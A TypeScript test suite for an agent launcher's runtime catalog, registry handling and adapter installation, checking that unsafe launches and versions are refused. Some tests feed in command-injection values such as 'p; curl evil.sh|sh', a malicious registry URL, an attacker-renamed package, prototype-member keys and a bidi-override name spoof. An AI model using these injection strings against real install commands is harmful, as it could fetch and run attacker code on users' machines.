import assert from "node:assert/strict";
import { test } from "node:test";
import {
  adapterInstallCommand,
  builtinRuntimes,
  cacheRegistry,
  resolveRuntime,
  runtimeCatalog,
  type RuntimeSpec,
} from "../../core/index.js";
import { MAX_SHOWN_NAME_CHARS } from "../../core/customRuntimes.js";
import { executables, installed, policy, registryText, spec, storage } from "../runtime-fixtures.js";

test("a bare command resolves to the canonical absolute executable", async () => {
  const runtime = await resolveRuntime(spec({ launch: { command: "claude-agent-acp", args: ["--acp"], env: {} } }), {
    executable: executables({ "claude-agent-acp": "/opt/node/bin/claude-agent-acp" }),
  });

  assert.equal(runtime.launch.command, "/opt/node/bin/claude-agent-acp");
  assert.deepEqual(runtime.launch.args, ["--acp"]);
});

test("a package runner is refused: a Session must never fetch and execute code", async () => {
  await assert.rejects(
    resolveRuntime(spec({ launch: { command: "npx", args: ["@agentclientprotocol/claude-agent-acp"], env: {} } }), {
      executable: executables({ npx: "/opt/node/bin/npx" }),
    }),
    /npx/,
  );
});

test("a package runner dressed in trailing punctuation is refused too", async () => {
  // Windows discards trailing dots and spaces when it opens a file, so each of
  // these starts npx just as surely as "npx" does.
  for (const dressed of ["npx.", "npx ", " npx", "NPX.EXE", "npx.CMD", "npx.exe.cmd", "corepack"]) {
    await assert.rejects(
      // Installed under its own name, so nothing but the name can raise the refusal.
      resolveRuntime(spec({ launch: { command: dressed, args: [], env: {} } }), {
        executable: executables({ [dressed]: `/opt/node/bin/${dressed}` }),
      }),
      /fetches and runs code/,
      `"${dressed}" must be refused`,
    );
  }
});

test("a general-purpose runtime launching a local script is allowed", async () => {
  const resolved = await resolveRuntime(
    spec({ launch: { command: "bun", args: ["/home/me/agent.ts"], env: {} } }),
    { executable: executables({ bun: "/opt/bin/bun" }) },
  );

  assert.equal(resolved.launch.command, "/opt/bin/bun");
});

test("every built-in Runtime resolves to an installed executable, not a package runner", async () => {
  for (const runtime of builtinRuntimes(policy)) {
    const resolved = await resolveRuntime(runtime, { executable: installed });
    assert.match(resolved.launch.command, /^\/opt\/bin\//, `${runtime.id} launches ${resolved.launch.command}`);
    assert.equal(resolved.launch.command, `/opt/bin/${runtime.adapter?.bin ?? runtime.launch.command}`);
  }
});

test("a relative path is refused: it names a different file per working directory", async () => {
  await assert.rejects(
    resolveRuntime(spec({ launch: { command: "./bin/agent", args: [], env: {} } }), {
      executable: executables({ "./bin/agent": "/repo/bin/agent" }),
    }),
    /must be absolute or a bare name/,
  );
});

test("a command that is not installed is refused, naming the adapter to install", async () => {
  await assert.rejects(
    resolveRuntime(
      spec({
        launch: { command: "claude-agent-acp", args: [], env: {} },
        adapter: { package: "@agentclientprotocol/claude-agent-acp", version: "0.70.0", bin: "claude-agent-acp" },
      }),
      { executable: executables({}) },
    ),
    /not found — install @agentclientprotocol\/claude-agent-acp@0\.70\.0/,
  );
});

test("a command that resolves onto a package runner is refused", async () => {
  await assert.rejects(
    resolveRuntime(spec({ launch: { command: "my-agent", args: [], env: {} } }), {
      executable: executables({ "my-agent": "/opt/node/bin/npx" }),
    }),
    /which fetches and runs code/,
  );
});



// ---------------------------------------------------------------------------
// Registry document, cache, and catalog composition
// ---------------------------------------------------------------------------

test("without a registry the built-in catalog still launches, at its own pinned versions", () => {
  const claude = runtimeCatalog({ policy }).find((runtime) => runtime.id === "claude");

  assert.equal(claude?.adapter?.package, "@agentclientprotocol/claude-agent-acp");
  assert.match(claude?.adapter?.version ?? "", /^\d+\.\d+\.\d+$/);
  assert.equal(claude?.launch.command, claude?.adapter?.bin);
});

test("the registry refreshes adapter versions but never the launch command", async () => {
  const registry = await cacheRegistry(storage(), registryText, 1_000);
  const claude = runtimeCatalog({ policy, registry }).find((runtime) => runtime.id === "claude");

  assert.equal(claude?.adapter?.version, "0.71.0");
  assert.equal(claude?.launch.command, "claude-agent-acp");
});

test("a pin wins over the registry, under either the Registry id or the Runtime id", async () => {
  const registry = await cacheRegistry(storage(), registryText, 1_000);

  for (const key of ["claude-acp", "claude"]) {
    const pinned = runtimeCatalog({ policy, registry, pins: { [key]: "0.69.0" } });
    assert.equal(pinned.find((runtime) => runtime.id === "claude")?.adapter?.version, "0.69.0", key);
  }
});

test("a pin that names no exact version disables only the Runtime it names", async () => {
  for (const floating of ["latest", "^0.70.0", ">=0.70", "01.2.3", ""]) {
    const catalog = runtimeCatalog({ policy, pins: { "claude-acp": floating } });
    assert.equal(catalog.length, builtinRuntimes(policy).length, `pin "${floating}" emptied the catalog`);

    await assert.rejects(
      resolveRuntime(catalog.find((runtime) => runtime.id === "claude") as RuntimeSpec, { executable: installed }),
      /exact version/,
      `pin "${floating}" must refuse the Runtime it names`,
    );
    // An unrelated Runtime is untouched by someone else's typo.
    const codex = await resolveRuntime(catalog.find((runtime) => runtime.id === "codex") as RuntimeSpec, {
      executable: installed,
    });
    assert.equal(codex.launch.command, "/opt/bin/codex-acp");
  }
});

test("a registry entry that renamed the package is ignored: it is a different artifact", async () => {
  const renamed = JSON.stringify({
    version: "1.0.0",
    agents: [
      {
        id: "claude-acp",
        name: "Claude Agent",
        version: "9.9.9",
        distribution: { npx: { package: "@attacker/claude-agent-acp@9.9.9" } },
      },
    ],
  });
  const registry = await cacheRegistry(storage(), renamed, 1_000);
  const claude = runtimeCatalog({ policy, registry }).find((runtime) => runtime.id === "claude");

  assert.equal(claude?.adapter?.package, "@agentclientprotocol/claude-agent-acp");
  assert.notEqual(claude?.adapter?.version, "9.9.9");
});

test("settings override a built-in launch and drop the adapter it no longer uses", () => {
  const catalog = runtimeCatalog({
    policy,
    overrides: { claude: { command: "/opt/custom/claude-agent-acp", args: ["--acp"] } },
  });
  const claude = catalog.find((runtime) => runtime.id === "claude");

  assert.equal(claude?.launch.command, "/opt/custom/claude-agent-acp");
  assert.deepEqual(claude?.launch.args, ["--acp"]);
  assert.equal(claude?.adapter, undefined);
});

test("a disabled Runtime leaves the catalog entirely", () => {
  const catalog = runtimeCatalog({ policy, overrides: { gemini: { enabled: false } } });

  assert.equal(catalog.find((runtime) => runtime.id === "gemini"), undefined);
  assert.equal(catalog.length, builtinRuntimes(policy).length - 1);
});

test("a custom Runtime joins the catalog with no built-in policy of its own", async () => {
  const catalog = runtimeCatalog({ policy, overrides: { "my-acp": { command: "my-acp", args: ["--acp"] } } });
  const custom = catalog.find((runtime) => runtime.id === "my-acp");

  assert.equal(custom?.custom, true);
  assert.equal(custom?.suppression, undefined);
  assert.equal(custom?.adapter, undefined);

  const resolved = await resolveRuntime(custom as RuntimeSpec, {
    executable: executables({ "my-acp": "/opt/bin/my-acp" }),
  });
  const trusted = await resolveRuntime(custom as RuntimeSpec, {
    executable: executables({ "my-acp": "/opt/bin/my-acp" }),
    trust: { fingerprint: resolved.fingerprint },
  });
  assert.equal(trusted.trusted, true);
  // ADR-0008: trust alone is not a Suppression Capability. A custom Runtime has no
  // built-in plan, so it stays ineligible for Shim injection until one is verified.
  assert.equal(trusted.capabilities.suppression, false);
});

test("installing an adapter names one exact release and nothing looser", () => {
  const [claude] = builtinRuntimes(policy);
  const install = adapterInstallCommand(claude.adapter as { package: string; version: string; bin: string });

  assert.equal(install.command, "npm");
  assert.ok(install.args.includes(`${claude.adapter?.package}@${claude.adapter?.version}`));

  for (const loose of ["latest", "^1.2.3", "1.2", "01.2.3", "1.2.3 && curl evil.sh"]) {
    assert.throws(
      () => adapterInstallCommand({ package: "p", version: loose, bin: "p" }),
      /exact version/,
      `version "${loose}" must be refused`,
    );
  }
});

// ---------------------------------------------------------------------------
// Settings that cannot be honoured refuse one Runtime, never the catalog
// ---------------------------------------------------------------------------



test("an override that blanks the command fails loudly instead of falling back", async () => {
  const catalog = runtimeCatalog({ policy, overrides: { claude: { command: "" } } });

  await assert.rejects(
    resolveRuntime(catalog.find((runtime) => runtime.id === "claude") as RuntimeSpec, { executable: installed }),
    /empty/,
  );
});

test("the registry may raise an adapter version but never lower it", async () => {
  const downgrade = JSON.stringify({
    version: "1.0.0",
    agents: [
      {
        id: "claude-acp",
        name: "Claude Agent",
        version: "0.0.1",
        distribution: { npx: { package: "@agentclientprotocol/claude-agent-acp@0.0.1" } },
      },
    ],
  });
  const registry = await cacheRegistry(storage(), downgrade, 1_000);
  const [builtIn] = builtinRuntimes(policy);

  const held = runtimeCatalog({ policy, registry }).find((runtime) => runtime.id === "claude");
  assert.equal(held?.adapter?.version, builtIn.adapter?.version);

  // A user who wants the older release still gets it, by saying so explicitly.
  const pinned = runtimeCatalog({ policy, registry, pins: { "claude-acp": "0.0.1" } });
  assert.equal(pinned.find((runtime) => runtime.id === "claude")?.adapter?.version, "0.0.1");
});



test("replacing a built-in's launch stops it passing as the built-in", async () => {
  const catalog = runtimeCatalog({ policy, overrides: { claude: { command: "/tmp/something-else" } } });
  const claude = catalog.find((runtime) => runtime.id === "claude") as RuntimeSpec;

  assert.equal(claude.custom, true, "a user-supplied executable is a user-defined Runtime");
  assert.notEqual(claude.displayName, "Claude Code");
  assert.equal(claude.suppression, undefined, "the built-in's policy recipe does not describe it");
  assert.equal(claude.adapter, undefined);

  const resolved = await resolveRuntime(claude, {
    executable: executables({ "/tmp/something-else": "/tmp/something-else" }),
  });
  assert.equal(resolved.custom, true);
});

test("replacing a built-in's argv stops it claiming the suppression that argv carried", () => {
  const [copilot] = runtimeCatalog({ policy, overrides: { copilot: { args: ["--acp"] } } })
    .filter((runtime) => runtime.id === "copilot");

  // The catalog's --excluded-tools flags are gone; the spec must not still assert
  // that this Runtime suppresses anything.
  assert.equal(copilot.custom, true);
  assert.equal(copilot.policy.suppressBuiltInSubagents, false);
  assert.equal(copilot.suppression, undefined);
});

test("an override that restates the catalog's launch is not a replacement", () => {
  const [copilot] = runtimeCatalog({ policy, overrides: { copilot: { args: ["--acp", "--stdio"] } } })
    .filter((runtime) => runtime.id === "copilot");

  // Nothing about what runs has changed, so the Suppression Plan still describes
  // it — and keeps appending its exclusions on top of the arguments given.
  assert.deepEqual(copilot.launch.args, ["--acp", "--stdio", "--excluded-tools", "task,read_agent"]);
  assert.equal(copilot.policy.suppressBuiltInSubagents, true);
});

test("a non-string command from settings refuses one Runtime rather than crashing", async () => {
  const catalog = runtimeCatalog({ policy, overrides: { claude: { command: 42 as unknown as string } } });

  assert.equal(catalog.length, builtinRuntimes(policy).length);
  await assert.rejects(
    resolveRuntime(catalog.find((runtime) => runtime.id === "claude") as RuntimeSpec, { executable: installed }),
    /command must be a string/,
  );
});

test("a malformed argument list disables only the Runtime it belongs to", async () => {
  for (const malformed of [5, "abc", { 0: "x" }, ["a", 1]] as unknown as string[][]) {
    const catalog = runtimeCatalog({ policy, overrides: { gemini: { args: malformed } } });
    assert.equal(catalog.length, builtinRuntimes(policy).length, "the catalog must survive bad settings");

    await assert.rejects(
      resolveRuntime(catalog.find((runtime) => runtime.id === "gemini") as RuntimeSpec, { executable: installed }),
      /arguments/,
      `args ${JSON.stringify(malformed)} must refuse only gemini`,
    );
    const codex = await resolveRuntime(catalog.find((runtime) => runtime.id === "codex") as RuntimeSpec, {
      executable: installed,
    });
    assert.equal(codex.launch.command, "/opt/bin/codex-acp");
  }
});

test("a pin nobody can honour offers no installation either", () => {
  const catalog = runtimeCatalog({ policy, pins: { "claude-acp": "latest" } });
  const claude = catalog.find((runtime) => runtime.id === "claude");

  // Offering the catalog default would install a version the user did not ask for.
  assert.equal(claude?.adapter, undefined);
});

test("a pin for an adapter the user replaced does not outlive it", async () => {
  const catalog = runtimeCatalog({
    policy,
    pins: { "claude-acp": "latest" },
    overrides: { claude: { command: "/opt/custom/agent" } },
  });
  const claude = catalog.find((runtime) => runtime.id === "claude") as RuntimeSpec;

  assert.equal(claude.unavailable, undefined);
  const resolved = await resolveRuntime(claude, {
    executable: executables({ "/opt/custom/agent": "/opt/custom/agent" }),
  });
  assert.equal(resolved.launch.command, "/opt/custom/agent");
});

test("installing an adapter refuses a package name that is not one", () => {
  for (const name of ["--registry=http://evil.example", "-g", "--global", "p; curl evil.sh|sh", "", "@scope", "../etc"]) {
    assert.throws(
      () => adapterInstallCommand({ package: name, version: "1.2.3", bin: "p" }),
      /package name/,
      `package "${name}" must be refused`,
    );
  }
  assert.ok(adapterInstallCommand({ package: "@scope/pkg", version: "1.2.3", bin: "p" }).args.length);
});

test("a runtime id that names an Object prototype member does not take the catalog down", () => {
  // Settings keys are arbitrary strings, and the plan lookup is an index into a
  // plain object. Refuse the one Runtime, never throw the catalog away.
  for (const id of ["constructor", "toString", "valueOf", "__proto__", "hasOwnProperty"]) {
    const catalog = runtimeCatalog({
      policy: { suppressBuiltInSubagents: true },
      overrides: { [id]: { command: "/opt/bin/agent" } },
    });

    assert.ok(
      catalog.some((runtime) => runtime.id === "claude"),
      `an id of "${id}" emptied the catalog`,
    );
    const entry = catalog.find((runtime) => runtime.id === id);
    assert.equal(entry?.suppression, undefined, `"${id}" was given a built-in plan`);
  }
});

test("a custom runtime cannot take a built-in's name by spelling its key differently", () => {
  // `agentConductor.runtimes` is a scope a repository writes, and the name it
  // supplies leads the dialog that approves the launch. A key that reads as a
  // built-in once whitespace is normalised must not present as one (ADR-0007).
  const catalog = runtimeCatalog({
    policy,
    overrides: { "Claude  Code": { command: "/tmp/not-claude" } },
  });

  const names = catalog.map((spec) => spec.displayName);
  assert.equal(
    new Set(names).size,
    names.length,
    `two runtimes present under one name: ${names.join(" | ")}`,
  );
});

test("the mark on a custom runtime survives being shown", () => {
  // Padded past what a dialog shows, with characters `\s` does not cover, so
  // that a clamp from the right takes the mark and leaves the familiar name —
  // and ending with an override that would draw what follows it backwards.
  const padded = `Claude Code ${"\u200b".repeat(70)}\u202e`;
  // And padded with characters that are plainly visible, which flattening keeps.
  const long = `Claude Code ${"x".repeat(200)}`;
  const both = runtimeCatalog({
    policy,
    overrides: { [padded]: { command: "/tmp/a" }, [long]: { command: "/tmp/b" } },
  });

  for (const custom of both.filter((spec) => spec.custom)) {
    assert.ok(
      custom.displayName.length <= MAX_SHOWN_NAME_CHARS,
      `${custom.displayName.length} characters will be cut before the mark: ${custom.displayName}`,
    );
    assert.match(custom.displayName, /\(custom\)$/);
    // And no formatting character in it: those take up characters but no width,
    // and one of them draws what follows it backwards — so a mark that the
    // length above says is present can still be unreadable. Padding that is
    // merely blank but has width is not covered here; it cannot take the mark,
    // because the mark is added after the cut.
    assert.equal(
      /\p{Cf}/u.test(custom.displayName),
      false,
      `a formatting character survived: ${JSON.stringify(custom.displayName)}`,
    );
  }
  assert.equal(both.filter((spec) => spec.custom).length, 2, "a custom runtime was dropped");
});

test("DeepSeek Harness is catalogued as a preview: pinned ACP adapter, no suppression recipe", () => {
  const dsh = builtinRuntimes(policy).find((runtime) => runtime.id === "dsh");
  assert.ok(dsh, "the catalog lists DeepSeek Harness");
  // dsh's own launcher boots a profile holding DeepSeek's ACP plugin: the
  // official route, proven to answer `initialize` and open a session.
  assert.equal(dsh.launch.command, "dsh");
  assert.deepEqual(dsh.launch.args, ["--profile", "acp"]);
  assert.deepEqual(dsh.adapter, { package: "@deepseek-ai/dsh", version: "0.1.1-rc.2", bin: "dsh" });
  assert.equal(dsh.registryId, undefined, "not in the ACP Registry: the pin moves only by catalog change");
  // The vendor calls it a developer preview with breaking changes ahead, and the
  // picker draws nothing else about an entry, so the name says so.
  assert.match(dsh.displayName, /preview/i, "the picker must say it is a preview");
  // No documented way to switch dsh's own subagents off exists, so it carries
  // no plan and stays ineligible for Shim injection (ADR-0008, fail closed).
  assert.equal(dsh.suppression, undefined);
  assert.equal(dsh.loginCommand, "dsh web");
  // dsh's ACP exposes no Config Options and no launch flag sets its model, so
  // `/model` must say there is nothing to choose — not "reconnect with the
  // value you want", which is what process-scoped config would make it say.
  assert.equal(dsh.quirks.processScopedConfig, false);
  // Its ACP rejects a non-empty `mcpServers`: injected, the session would fail
  // to open, so the catalog says never to inject it (ADR-0014).
  assert.equal(dsh.quirks.refusesMcpServers, true);
});
